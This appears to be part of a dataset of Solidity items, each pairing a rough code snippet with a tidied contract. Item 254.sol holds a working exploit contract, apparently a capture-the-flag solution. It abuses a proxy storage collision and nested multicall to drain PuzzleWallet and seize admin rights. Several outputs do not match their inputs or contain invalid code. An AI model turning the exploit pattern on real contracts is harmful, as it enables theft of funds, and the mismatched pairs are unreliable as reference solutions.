        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    // TODO implement a way to keep track of the requests\n    // so that you can pair the incoming result to its according request data\n\n    address oracle = address(0x123);\n\n    function requestNFTOwnerCheck(address owner, address collection, uint256 tokenID, uint16 chainID) external {\n        (bool success, ) = oracle.call(abi.encode(owner, collection, tokenID, chainID));\n        require(success);\n    }\n\n    function callback(bool result) external {\n        require(msg.sender == oracle, \"This function can be invoked only by the oracle\");\n    }\n}\n\n"
    },
    "246.sol": {
        "input": "function payment (address payable beneficiary) payable external{\n  uint256 amount = msg.value;\n  beneficiary.transfer(amount);\n}\n\nfunction payment(e){\n e.preventDefault();\n const nonce = await web3.eth.getTransactionCount(myAddress, 'latest');\n const data = project.methods.payment('0xe13DC66579940552574Cbe795410423609C2BFd9').encodeABI();\n   \n     }\nconst transaction = {\n 'to': 'contract Address',\n 'value': 100000000000000000, \n 'gas': 30000,\n 'maxFeePerGas': 1000000108,\n 'nonce': nonce,\n};\nconst signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATE_KEY);\n\nweb3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {\nif (!error) {\n  console.log(\"\ud83c\udf89 The hash of your transaction is: \", hash, \"\\n Check Alchemy's Mempool to view the status of your transaction!\");\n} else {\n  console.log(\"\u2757Something went wrong while submitting your transaction:\", error)\n}\n});\n\n\n",
        "output": "pragma solidity ^0.5.16;\n contract Address {\n    function payment(address payable recipient) external payable {\n      uint256 amount = msg.value;\n      recipient.transfer(amount);\n    }\n  \n   function () payable external{\n    }\n  }\n\n"
    },
    "247.sol": {
        "input": "function returnStaked (address addressStaked) public view returns (Stakes[] memory) {\n   return addressToStaked[addressStaked];\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IStakers {\n    function stake() external payable;\n}\n\n"
    },
    "249.sol": {
        "input": "   function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n        liquidity = IUniswapV2Pair(pair).mint(to);\n    }\n\nIUniswapV2Pair(pair).mint(to)\n\n_mint(to, liquidity);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);\n\n    function feeTo() external view returns (uint);\n\n    function feeToAccount() external view returns (uint);\n\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\n"
    },
    "251.sol": {
        "input": "constructor(uint256 initialSupply) ERC20 (\"MAstering ther\",\"MET\")\n{\n    _mint(msg.sender, initialSupply);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n interface ERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "252.sol": {
        "input": "pragma solidity ^0.8.16;\ncontract todo\n{\n   struct llist\n   {  \n       uint no ;         \n       string cont ;        \n       address own ;         \n       bool iscom ;            \n       uint ttim ;              \n   }\n    uint public i ; \n    mapping ( address => uint) public num ;        \n    mapping ( address => llist[]) public num2 ;   \n    function real( string memory _contect) public\n    {\n        if (  num[msg.sender] > 98)\n\n        {\n            i = 8 ;\n        }\n\n        else\n        {\n       num2[msg.sender].push( llist(num[msg.sender] , \n         _contect,payable(msg.sender),false,block.timestamp));    \n                  num[msg.sender]++ ;\n        }\n     }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract todo {\n    struct llist {\n        uint no;\n        string cont;\n        address own;\n        bool iscom;\n        uint ttim;\n    }\n    \n    uint public i;\n    mapping(address => uint) public num;\n    mapping(address => llist[]) public num2;\n    \n    function real(string memory _contect) public {\n        if (num[msg.sender] > 98) {\n            i = 8;\n        } else {\n            num2[msg.sender].push(llist(num[msg.sender], _contect, payable(msg.sender), false, block.timestamp));\n            num[msg.sender]++;\n        }\n    }\n}\n"
    },
    "254.sol": {
        "input": "pragma solidity ^0.6.0;\npragma experimental ABIEncoderV2;\n\nimport \"./PuzzleWallet.sol\";\n\ncontract Exploit{\n    PuzzleProxy public proxy;\n\n    constructor(PuzzleProxy _proxy) public payable{\n        require(msg.value == 0.001 ether, \"incorrect msg.value\");\n        proxy = _proxy;\n        proxy.proposeNewAdmin(address(this));\n\n        PuzzleWallet wallet = PuzzleWallet(address(proxy));\n        wallet.addToWhitelist(address(this));\n     \n        bytes memory data = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n\n        bytes[] memory data1 = new bytes[](1);\n        data1[0] = data;\n\n        bytes memory data2 = abi.encodeWithSelector(PuzzleWallet.multicall.selector, data1);\n\n        bytes[] memory data3 = new bytes[](2);\n        data3[0] = data2;\n        data3[1] = data2;\n        \n\n        wallet.multicall{value:0.001 ether}(data3);  \n        uint256 balance  = wallet.balances(address(this));\n        require(balance == 0.002 ether, \"unexpected balance\");\n\n        wallet.execute(msg.sender, balance, new bytes(0));\n        wallet.setMaxBalance(uint256(uint160(address(this))));\n\n        require(proxy.admin() == address(this), \"fail to exploit\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address account) external view returns (uint);\n    function decimals() external view returns (uint);\n}\n\n"
    },
    "255.sol": {
        "input": "contract SelfWhitelist {\n\n    mapping(address => bool) public addressWhitelist;\n\n    function whitelist() public returns(string memory) {\n        if (check()) {\n            return \"Already whitelisted!\";\n        }\n        addressWhitelist[msg.sender] = true;\n        return \"Whitelisted!\";\n    }\n\n    function check() public view returns (bool) {\n\n        return addressWhitelist[msg.sender];\n    }\n}\n\n for(uint i = 0; i < addressWhitelist.length; i++) {\n    if(addressWhitelist[i] != msg.sender) {\n        addressWhitelist.push(msg.sender);\n        return \"Whitelisted!\";\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SelfWhitelist {\n\n    mapping(address => bool) public addressWhitelist;\n\n    function whitelist() public returns(string memory) {\n        if (check()) {\n            return \"Already whitelisted!\";\n        }\n        addressWhitelist[msg.sender] = true;\n        return \"Whitelisted!\";\n    }\n\n    function check() public view returns (bool) {\n\n        return addressWhitelist[msg.sender];\n    }\n}\n\n"
    },
    "256.sol": {
        "input": "const bytesHex = web3.eth.abi.encodeParameters(\n    ['address', 'uint256'],\n    ['0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe', '1']\n);\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    function foo2(address param1, uint256 param2) external {\n    }\n    \n    function foo1(bytes memory params) external {\n        (address decodedAddress, uint256 decodedUint) = abi.decode(params, (address, uint256));\n        this.foo2(decodedAddress, decodedUint);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function foo2(address param1, uint256 param2) external {\n        // function body\n    }\n    \n    function foo1(bytes memory params) external {\n        (address decodedAddress, uint256 decodedUint) = abi.decode(params, (address, uint256));\n        this.foo2(decodedAddress, decodedUint);\n    }\n}\n"
    },
    "257.sol": {
        "input": "interface IERC20 {\n   function transfer(address _to, uint256 _value) external returns (bool);\n   function balanceOf(address account) external view returns (uint);\n}\n\nIERC20 usdt = IERC20(address(\"token smart contract address in hex format\"));\n\nuint256 usdtBalance = usdt.balanceOf('your wallet address in hex format');\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n   function transfer(address _to, uint256 _value) external returns (bool);\n   function balanceOf(address account) external view returns (uint);\n}\n\n"
    },
    "258.sol": {
        "input": "function changeMap() external {\n  require(msg.sender == _contractBAddress, 'address not match');\n}\n\nmodifier onlyContractB {\n        require(\n            msg.sender == _contractBAddress,\n            \"Only contractB can call this function.\"\n        );\n        _;\n    }\n\nfunction changeMap() onlyContractB {\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ContractA {\n    address private _contractBAddress;\n    \n    modifier onlyContractB()\n    {\n        require(\n            msg.sender == _contractBAddress,\n            \"Only contractB can call this function.\"\n        );\n        _;\n    }\n\n    constructor() public {\n        _contractBAddress = 0x835739891434443709598510388402134707628;\n    }\n\n    function changeMap() external onlyContractB {\n    }\n}\n\n"
    },
    "259.sol": {
        "input": "pragma solidity >=0.4.22 <0.8.11;\n\ncontract Serializer {\n\n    function hexStringToIntArray(string memory s) public pure returns (uint64[] memory) {\n        uint size = bytes(s).length / 16;\n        uint64[] memory result = new uint64[](size);\n        for (uint i = 0; i< size; i++) {\n            string memory strSlice = getSlice(i*16, (i+1)*16, s);\n            result[i] = hexStringToInt(strSlice);\n        }\n        return result;\n    }\n\n    function getSlice(uint startIndex, uint endIndex, string memory str) public pure returns (string memory) {\n        bytes memory strBytes = bytes(str);\n        bytes memory result = new bytes(endIndex-startIndex);\n        for(uint i = startIndex; i < endIndex; i++) {\n            result[i-startIndex] = strBytes[i];\n        }\n        return string(result);\n    }\n\n    function hexBytesToInt(bytes memory ss) public pure returns (uint64){\n        uint64 val = 0;\n        uint8 a = uint8(97); \n        uint8 zero = uint8(48); \n        uint8 nine = uint8(57); \n        uint8 A = uint8(65); \n        uint8 F = uint8(70); \n        uint8 f = uint8(102); \n        for (uint i=0; i<ss.length; ++i) {\n            uint8 byt = uint8(ss[i]);\n            if (byt >= zero && byt <= nine) byt = byt - zero;\n            else if (byt >= a && byt <= f) byt = byt - a + 10;\n            else if (byt >= A && byt <= F) byt = byt - A + 10;\n            val = (val << 4) | (byt & 0xF);\n        }\n        return val;\n    }\n\n    function hexStringToInt(string memory s) public pure returns (uint64) {\n        bytes memory ss = bytes(s);\n        uint64 val = hexBytesToInt(ss);\n        return val;\n    }\n}\n\nconst Serializer = artifacts.require(\"Serializer\");\nconst truffleAssert = require(\"truffle-assertions\");\nconst fs = require(\"fs\");\nconst { readLines } = require(\"./utils.js\");\nconst BN = web3.utils.BN;\n\ncontract(\"Serializer\", (accounts) => {\n  const [deployerAddress, tokenHolderOneAddress, tokenHolderTwoAddress] = accounts;\n\n  it(\"hexStringToInt\", async () => {\n    let s = await Serializer.deployed();\n    let result = await s.hexStringToInt.call(\"08bbe0e25e412fff\");\n    let expected = new BN(\"629343835796877311\");\n    assert.equal(result.toString(10), expected.toString(10));\n    result = await s.hexStringToInt.call(\"08bbe0e25e4a0fff\");\n    expected = new BN(\"629343835797458943\");\n    assert.equal(result.toString(10), expected.toString(10));\n    result = await s.hexStringToInt.call(\"08bbe0e25e4a3fff\");\n    expected = new BN(\"629343835797471231\");\n    assert.equal(result.toString(10), expected.toString(10));\n  });\n  it(\"getSlice1\", async () => {\n    let s = await Serializer.deployed();\n    let result = await s.getSlice.call(0, 16, \"08bbe0e25e412fff08bbe0e25e4a0fff08bbe0e25e4a3fff\");\n    let expected = \"08bbe0e25e412fff\";\n    assert.equal(result, expected);\n  });\n  it(\"getSlice2\", async () => {\n    let s = await Serializer.deployed();\n    const result = await s.getSlice.call(16, 32, \"08bbe0e25e412fff08bbe0e25e4a0fff08bbe0e25e4a3fff\");\n    const expected = \"08bbe0e25e4a0fff\";\n    assert.equal(result, expected);\n  });\n  it(\"getSlice3\", async () => {\n    let s = await Serializer.deployed();\n    const result = await s.getSlice.call(32, 48, \"08bbe0e25e412fff08bbe0e25e4a0fff08bbe0e25e4a3fff\");\n    const expected = \"08bbe0e25e4a3fff\";\n    assert.equal(result, expected);\n  });\n  it(\"hexStringToIntArray\", async () => {\n    let s = await Serializer.deployed();\n    let result = await s.hexStringToIntArray.call(\"08bbe0e25e412fff08bbe0e25e4a0fff08bbe0e25e4a3fff\");\n    console.log(result);\n    let expected = [\n      new BN(\"629343835796877311\").toString(),\n      new BN(\"629343835797458943\").toString(),\n      new BN(\"629343835797471231\").toString(),\n    ];\n    const resultS = result.map((x) => x.toString());\n    assert.deepEqual(resultS, expected);\n  });\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Serializer {\n\n  function hexStringToIntArray(string memory s) public pure returns (uint64[] memory) {\n    uint size = bytes(s).length / 16;\n    uint64[] memory result = new uint64[](size);\n    for (uint i = 0; i< size; i++) {\n      string memory strSlice = getSlice(i*16, (i+1)*16, s);\n      result[i] = hexStringToInt(strSlice);\n    }\n    return result;\n  }\n\n  function getSlice(uint startIndex, uint endIndex, string memory str) public pure returns (string memory) {\n    bytes memory strBytes = bytes(str);\n    bytes memory result = new bytes(endIndex-startIndex);\n    for(uint i = startIndex; i < endIndex; i++) {\n      result[i-startIndex] = strBytes[i];\n    }\n    return string(result);\n  }\n\n  function hexBytesToInt(bytes memory ss) public pure returns (uint64){\n    uint64 val = 0;\n    uint8 a = uint8(97); \n    uint8 zero = uint8(48); \n    uint8 nine = uint8(57); \n    uint8 A = uint8(65); \n    uint8 F = uint8(70); \n    uint8 f = uint8(102); \n    for (uint i=0; i<ss.length; ++i) {\n      uint8 byt = uint8(ss[i]);\n      if (byt >= zero && byt <= nine) byt = byt - zero;\n      else if (byt >= a && byt <= f) byt = byt - a + 10;\n      else if (byt >= A && byt <= F) byt = byt - A + 10;\n      val = (val << 4) | (byt & 0xF);\n    }\n    return val;\n  }\n\n  function hexStringToInt(string memory s) public pure returns (uint64) {\n    bytes memory ss = bytes(s);\n    uint64 val = hexBytesToInt(ss);\n    return val;\n  }\n}\n\n"
    },
    "260.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Test {\n    uint256[] public threshold = [21000, 2000, 3000];\n\n    function setThreshold(uint256[] memory _threshold) public {\n        threshold = _threshold;\n    }\n}\n\ndef main():\n    check = Test.deploy({\"from\": accounts[0]})\n    print(check.threshold(0))\n    check.setThreshold([1000, 1000, 1000], {\"from\": accounts[0]})\n    print(check.threshold(0))\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    uint256[] public threshold = [21000, 2000, 3000];\n\n    function setThreshold(uint256[] memory _threshold) public {\n        threshold = _threshold;\n    }\n}\n\n"
    },
    "261.sol": {
        "input": "contract FunWithStorage {\n    uint256 public favoriteNumber = 20; \n\n    string private test = \"hello1adsfdsfds\"; \n    bool public someBool = false; \n\n\n    uint256[] public myArray; \n}\n\nlet ARRAY_SLOT = 3;\n\nlet ITEM_SLOT = 0;\n\nlet length = BigInt(await getStorageAt(ARRAY_SLOT));\n\nlet location = BigInt(keccak256(encodePacked(ARRAY_SLOT))) + BigInt(ITEM_SLOT);\nlet memory = await getStorageAt(location);\n\ncontract Foo {\n    type User { \n        address owner;\n        uint balance;\n    }\n    User[] users;\n}\n\nlet ITEM_SLOT = ARRAY_ITEM_INDEX * ITEM_SIZE + ITEM_INDEX\nlet ITEM_SLOT = 3 * 2 + 1;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FunWithStorage {\n    uint256 public favoriteNumber = 20; \n\n    string private test = \"hello1adsfdsfds\"; \n    bool public someBool = false; \n\n\n    uint256[] public myArray; \n}\n\n"
    },
    "262.sol": {
        "input": "contract Test {\n    uint public blockNumber;\n    bytes32 public blockHashNow;\n    bytes32 public blockHashPrevious;\n\n    function setValues() {\n        blockNumber = block.number;\n        blockHashNow = block.blockhash(blockNumber);\n        blockHashPrevious = block.blockhash(blockNumber - 1);\n    }    \n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Test {\n    uint public blockNumber;\n    bytes32 public blockHashNow;\n    bytes32 public blockHashPrevious;\n\n    function setValues() {\n        blockNumber = block.number;\n        blockHashNow = block.blockhash(blockNumber);\n        blockHashPrevious = block.blockhash(blockNumber - 1);\n    }    \n}\n\n"
    },
    "263.sol": {
        "input": "function getPlayers() public view returns (uint) {\n        return players.length;\n    }\n\nfunction getPlayers() public view returns (address payable[] memory ) {\n        return players;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PlayerContract {\n    address payable[] public players;\n    \n    function addPlayer(address payable player) public {\n        players.push(player);\n    }\n\n    function getPlayersCount() public view returns (uint) {\n        return players.length;\n    }\n\n    function getPlayersAddress() public view returns (address payable[] memory) {\n        return players;\n    }\n}\n\n"
    },
    "264.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract StringToAddress {\n\nfunction stringToAddress(string memory _address) public pure returns (address) {\n    string memory cleanAddress = remove0xPrefix(_address);\n    bytes20 _addressBytes = parseHexStringToBytes20(cleanAddress);\n    return address(_addressBytes);\n}\n\nfunction remove0xPrefix(string memory _hexString) internal pure returns (string memory) {\n    if (bytes(_hexString).length >= 2 && bytes(_hexString)[0] == '0' && (bytes(_hexString)[1] == 'x' || bytes(_hexString)[1] == 'X')) {\n        return substring(_hexString, 2, bytes(_hexString).length);\n    }\n    return _hexString;\n}\n\nfunction substring(string memory _str, uint256 _start, uint256 _end) internal pure returns (string memory) {\n    bytes memory _strBytes = bytes(_str);\n    bytes memory _result = new bytes(_end - _start);\n    for (uint256 i = _start; i < _end; i++) {\n        _result[i - _start] = _strBytes[i];\n    }\n    return string(_result);\n}\n\nfunction parseHexStringToBytes20(string memory _hexString) internal pure returns (bytes20) {\n    bytes memory _bytesString = bytes(_hexString);\n    uint160 _parsedBytes = 0;\n    for (uint256 i = 0; i < _bytesString.length; i += 2) {\n        _parsedBytes *= 256;\n        uint8 _byteValue = parseByteToUint8(_bytesString[i]);\n        _byteValue *= 16;\n        _byteValue += parseByteToUint8(_bytesString[i + 1]);\n        _parsedBytes += _byteValue;\n    }\n    return bytes20(_parsedBytes);\n}\n\nfunction parseByteToUint8(bytes1 _byte) internal pure returns (uint8) {\n    if (uint8(_byte) >= 48 && uint8(_byte) <= 57) {\n        return uint8(_byte) - 48;\n    } else if (uint8(_byte) >= 65 && uint8(_byte) <= 70) {\n        return uint8(_byte) - 55;\n    } else if (uint8(_byte) >= 97 && uint8(_byte) <= 102) {\n        return uint8(_byte) - 87;\n    } else {\n        revert(string(abi.encodePacked(\"Invalid byte value: \", _byte)));\n    }\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.0;\n\ncontract StringToAddress {\n\nfunction stringToAddress(string memory _address) public pure returns (address) {\n    string memory cleanAddress = remove0xPrefix(_address);\n    bytes20 _addressBytes = parseHexStringToBytes20(cleanAddress);\n    return address(_addressBytes);\n}\n\nfunction remove0xPrefix(string memory _hexString) internal pure returns (string memory) {\n    if (bytes(_hexString).length >= 2 && bytes(_hexString)[0] == '0' && (bytes(_hexString)[1] == 'x' || bytes(_hexString)[1] == 'X')) {\n        return substring(_hexString, 2, bytes(_hexString).length);\n    }\n    return _hexString;\n}\n\nfunction substring(string memory _str, uint256 _start, uint256 _end) internal pure returns (string memory) {\n    bytes memory _strBytes = bytes(_str);\n    bytes memory _result = new bytes(_end - _start);\n    for (uint256 i = _start; i < _end; i++) {\n        _result[i - _start] = _strBytes[i];\n    }\n    return string(_result);\n}\n\nfunction parseHexStringToBytes20(string memory _hexString) internal pure returns (bytes20) {\n    bytes memory _bytesString = bytes(_hexString);\n    uint160 _parsedBytes = 0;\n    for (uint256 i = 0; i < _bytesString.length; i += 2) {\n        _parsedBytes *= 256;\n        uint8 _byteValue = parseByteToUint8(_bytesString[i]);\n        _byteValue *= 16;\n        _byteValue += parseByteToUint8(_bytesString[i + 1]);\n        _parsedBytes += _byteValue;\n    }\n    return bytes20(_parsedBytes);\n}\n\nfunction parseByteToUint8(bytes1 _byte) internal pure returns (uint8) {\n    if (uint8(_byte) >= 48 && uint8(_byte) <= 57) {\n        return uint8(_byte) - 48;\n    } else if (uint8(_byte) >= 65 && uint8(_byte) <= 70) {\n        return uint8(_byte) - 55;\n    } else if (uint8(_byte) >= 97 && uint8(_byte) <= 102) {\n        return uint8(_byte) - 87;\n    } else {\n        revert(string(abi.encodePacked(\"Invalid byte value: \", _byte)));\n    }\n}\n}\n\n"
    },
    "265.sol": {
        "input": "function sfStore(uint256 _simpleStorageIndex, uint256 _simpleStorageNumber) public {\n    SimpleStorage simpleStorage = SimpleStorage(address(simpleStorageArray[_simpleStorageIndex]));\n    simpleStorage.store(_simpleStorageNumber);\n} \n} \n\nfunction sfStore(uint256 _simpleStorageIndex, uint256 _simpleStorageNumber) public {\n  SimpleStorage simpleStorage = \n  SimpleStorage(address(simpleStorageArray[_simpleStorageIndex]));\n  simpleStorage.store(_simpleStorageNumber);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface SimpleStorage {\n    function store(uint256) external;\n}\n\ncontract SimpleStorageArray {\n    address[] public simpleStorageArray;\n\n    function init(address _simpleStorage) external {\n        simpleStorageArray.push(_simpleStorage);\n    } \n}\n\n"
    },
    "266.sol": {
        "input": "\npragma solidity 0.8.7;\ncontract A {\n    function foo() public pure virtual returns (string memory) {\n           return \"Foo Contract A\";\n    }\n\n    function bar() public pure returns (string memory) {\n          return \"Bar Contract A\";\n    }\ncontract B is A {\n    function foo() public pure override returns (string memory) {\n         return \"Foo Contract B\";\n    }\n}\n\ncontract B is A {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    function foo() public pure virtual returns (string memory) {\n           return \"Foo Contract A\";\n    }\n\n    function bar() public pure returns (string memory) {\n          return \"Bar Contract A\";\n    }\n}\n\n"
    },
    "267.sol": {
        "input": "function setPoint(SampleInterface.Point memory point) external {\n    SampleInterface(sample).setPoint(point);\n}\n\nfunction getPoint() external view returns(SampleInterface.Point memory) {\n    return SampleInterface(sample).getPoint();\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface SampleInterface {\n    struct Point {\n        uint x;\n        uint y;\n    }\n    \n    function setPoint(Point memory point) external;\n    function getPoint() external view returns(Point memory);\n}\n\ncontract SampleContract {\n    address sample;\n    \n    constructor(address _sample) {\n        sample = _sample;\n    }\n    \n    function setPoint(SampleInterface.Point memory point) external {\n        SampleInterface(sample).setPoint(point);\n    }\n\n    function getPoint() external view returns(SampleInterface.Point memory) {\n        return SampleInterface(sample).getPoint();\n    }\n}\n"
    },
    "268.sol": {
        "input": "require(msg.value >= mintPrice, \"Not enough ETH sent; check price!\"); \n\nconst transation = await contract.safeMint(userAccount, {\n    value: 1\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public mintPrice;\n\n    constructor(uint256 _mintPrice) {\n        mintPrice = _mintPrice;\n    }\n\n    function safeMint(address userAccount) external payable {\n        require(msg.value >= mintPrice, \"Not enough ETH sent; check price!\"); \n\n        // Minting logic here\n\n        // Transfer ownership or perform other actions\n    }\n}\n"
    },
    "269.sol": {
        "input": "pragma solidity >=0.6.0 <0.9.0;\n\ncontract SimpleStorage {\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract SimpleStorage {\n\n    address private owner;\n\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n\n    function setOwner(address _newOwner) public {\n        require(msg.sender == owner, \"Only owner can set new owner\");\n        require(_newOwner != owner, \"New owner cannot be the same as current owner\");\n        owner = _newOwner;\n    }\n\n    function() external payable {}\n}\n\n"
    },
    "270.sol": {
        "input": "function onERC721received(address, address _from, uint256 _tokenID) public returns (bytes4) {\n    emit Received(msg.sender, _sender, _tokenID) \n    return this.onERC721Received.selector;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ERC721Receiver {\n    \n    function onERC721received(address, address _from, uint256 _tokenID) public returns (bytes4) {}\n}\n\n"
    },
    "271.sol": {
        "input": "function getNumber() public view returns (uint256, bool) {\n    return (number, false);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary NumberProvider {\n\n  function getNumber() public view returns (uint256, bool) {\n    return (5, false);\n  }\n}\n\n"
    },
    "273.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract Test {\n\n     function testTransfer() external payable {}\n     function getBalance() external view returns (uint256) {\n       return address(this).balance;\n     }\n}\n\n\n",
        "output": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract Test {\n\n     function testTransfer() external payable {}\n     function getBalance() external view returns (uint256) {\n       return address(this).balance;\n     }\n}\n\n"
    },
    "275.sol": {
        "input": "pragma solidity >=0.5.0 < 0.9.0\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary MyLibrary {\n    \n    \n    function add(uint256 x, uint256 y) internal pure returns (uint256) {\n        return x + y;\n    }\n}\n\n"
    },
    "276.sol": {
        "input": "_totalSupply = 1000000000000 * 1e18;\n\n_totalSupply = 1000000000000 * (10 ** decimals);\n\n_totalSupply = 1000000000000 ether;\n\n_totalSupply = 1000000000000 * 1e18;\n\naddress[3] memory devs = [address(0x123), address(0x456), address(0x789)];\naddress dapp = address(0xabc);\naddress exchange = address(0xdef);\n\nuint256 totalSupplyRemaining = _totalSupply;\n\nuint256 devBalance = _totalSupply / 100;\nfor (uint i = 0; i < 3; i++) {\n    balances[devs[i]] = devBalance;\n    emit Transfer(address(0x0), devs[i], devBalance);\n    totalSupplyRemaining -= devBalance;\n}\n\nuint256 dappBalance = _totalSupply / 2;\nbalances[dapp] = dappBalance;\nemit Transfer(address(0x0), dapp, dappBalance);\ntotalSupplyRemaining -= dappBalance;\n\nbalances[exchange] = totalSupplyRemaining;\nemit Transfer(address(0x0), exchange, totalSupplyRemaining);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Token {\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n\n    uint256 public _totalSupply;\n\n    mapping(address => uint256) public balances;\n\n    mapping(address => uint256) public allowance;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed token, address indexed spender, uint256 value);\n\n    constructor() public {\n        name = \"Boredom Token\";\n        symbol = \"BOR\";\n        decimals = 18;\n        _totalSupply = 1000000000000 * 1e18;\n\n        _totalSupply = 1000000000000 * (10 ** decimals);\n\n        _totalSupply = 1000000000000 ether;\n\n        _totalSupply = 1000000000000 * 1e18;\n\n        address[3] memory devs = [address(0x123), address(0x456), address(0x789)];\n        address dapp = address(0xabc);\n        address exchange = address(0xdef);\n\n        uint256 totalSupplyRemaining = _totalSupply;\n\n        uint256 devBalance = _totalSupply / 100;\n        for (uint i = 0; i < 3; i++) {\n            balances[devs[i]] = devBalance;\n            emit Transfer(address(0x0), devs[i], devBalance);\n            totalSupplyRemaining -= devBalance;\n        }\n\n        uint256 dappBalance = _totalSupply / 2;\n        balances[dapp] = dappBalance;\n        emit Transfer(address(0x0), dapp, dappBalance);\n        totalSupplyRemaining -= dappBalance;\n\n        balances[exchange] = totalSupplyRemaining;\n        emit Transfer(address(0x0), exchange, totalSupplyRemaining);\n    }\n\n   \n\n\n    function () external payable {\n        revert();\n    }\n\n    \n\n    \n}\n\n"
    },
    "277.sol": {
        "input": "zombies.push(\n    Zombie(...) \n)\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Zombie {\n   \n    struct Zombie {\n        address owner;\n        uint8 zombies;\n    }\n}\n\n"
    },
    "278.sol": {
        "input": "pragma solidity ^0.8.10;\n\nimport \"openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\";\nimport \"openzeppelin-solidity/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\nimport \"openzeppelin-solidity/contracts/token/ERC20/extensions/ERC20Pausable.sol\";\nimport \"openzeppelin-solidity/contracts/token/ERC20/extensions/ERC20Capped.sol\";\nimport \"openzeppelin-solidity/contracts/access/Ownable.sol\";\n\n\n\n contract MyToken is ERC20, Ownable, ERC20Burnable, ERC20Pausable,ERC20Capped {\n    constructor () ERC20 (\"FlashToken\", \"FLT\") ERC20Capped(1000000000 * (10**uint256(18)))\n    {\n        _mint(msg.sender,1000000000 * (10**uint256(18)));\n    \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address account) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "279.sol": {
        "input": "IERC20 tokennew = IERC20(address(tokenContractAddress));\ntokennew.safeTransferFrom(msg.sender, to, amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n     function safeTransferFrom( address from, address to, uint256 amount ) external returns (bool);\n}\n\n"
    },
    "281.sol": {
        "input": "transferFrom(msg.sender, address(this), tokenAmount);\nthis.approve(uniswapV2Router.address, tokenAmount);\n\nfunction swapTokensForEth(uint tokenAmount) public {\n    require(tokenAmount > 0, \"Need to send some tokens\");\n    require(tradingOpen, \"Trading is not open yet\");\n\n\n    address[] memory path = new address[](2);\n    path[0] = address(this);\n    path[1] = uniswapV2Router.WETH();\n\n    transferFrom(msg.sender, address(this), tokenAmount);\n    this.approve(uniswapV2Router.address, tokenAmount);\n\n    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0, \n        path,\n        msg.sender, \n        block.timestamp + 300 \n    );\n}\n\n\n",
